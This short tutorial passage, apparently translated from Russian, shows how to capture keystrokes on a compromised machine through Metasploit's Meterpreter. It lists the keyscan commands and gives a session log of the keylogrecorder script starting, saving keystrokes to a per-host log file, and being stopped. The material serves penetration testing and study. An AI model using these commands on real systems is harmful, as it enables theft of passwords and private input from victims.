There are already two built-in keyloggers. One is just a set of commands: keyscan_start - starts the keylogger; keyscan_dump - displays the result; keyscan_stop - stops the keylogger.

There is also a script called keylogrecorder. It is more efficient than keyscan, and moreover, it writes the result to a log:

meterpreter > bgrun keylogrecorder
[*] Executed Meterpreter with Job ID 2
meterpreter > [*] Starting the keystroke sniffer...
[*] Keystrokes being saved in to /root/.msf4/logs/scripts/keylogrecorder/192.168.ххх.ххх_20111024.4455.txt #адрес лога
[*] Recording

meterpreter > bgkill 2 #disable keylogger
[*] Killing background job 2...
